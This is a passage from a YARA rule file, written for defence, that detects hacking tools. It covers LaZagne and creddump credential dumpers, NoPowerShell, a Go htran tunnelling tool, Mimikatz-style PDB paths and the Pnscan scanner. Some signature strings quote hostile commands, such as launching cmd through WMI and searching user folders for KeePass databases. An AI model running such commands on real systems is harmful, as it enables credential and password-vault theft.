      $x1 = "lazagne.config.powershell_execute(" fullword ascii
      $x2 = "creddump7.win32." ascii
      $x3 = "lazagne.softwares.windows.hashdump" ascii
      $x4 = ".softwares.memory.libkeepass.common(" ascii
   condition:
      2 of them
}

rule HKTL_NoPowerShell {
   meta:
      description = "Detects NoPowerShell hack tool"
      author = "Florian Roth"
      reference = "https://github.com/bitsadmin/nopowershell"
      date = "2018-12-28"
      hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"
   strings:
      $x1 = "\\NoPowerShell.pdb" fullword ascii
      $x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
      $x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
      $x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
      $x5 = "NoPowerShell.exe" fullword wide
   condition:
      1 of them
}
rule HKTL_htran_go {
   meta:
      author = "Jeff Beley"
      hash1 = "4acbefb9f7907c52438ebb3070888ddc8cddfe9e3849c9d0196173a422b9035f"
      description = "Detects go based htran variant"
      date = "2019-01-09"
   strings:
      $s1 = "https://github.com/cw1997/NATBypass" fullword ascii
      $s2 = "-slave ip1:port1 ip2:port2" fullword ascii
      $s3 = "-tran port1 ip:port2" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and 1 of them
}

rule SUSP_Katz_PDB {
   meta:
      description = "Detects suspicious PDB in file"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-02-04"
      hash1 = "6888ce8116c721e7b2fc3d7d594666784cf38a942808f35e309a48e536d8e305"
   strings:
      $s1 = /\\Release\\[a-z]{0,8}katz.pdb/
      $s2 = /\\Debug\\[a-z]{0,8}katz.pdb/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and all of them
}

rule HKTL_LNX_Pnscan {
   meta:
      description = "Detects Pnscan port scanner"
      author = "Florian Roth"
      reference = "https://github.com/ptrrkssn/pnscan"
      date = "2019-05-27"
      score = 55
   strings:
      $x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
      $x2 = "This program implements a multithreaded TCP port scanner." ascii wide
   condition:
      filesize < 6000KB and 1 of them
}
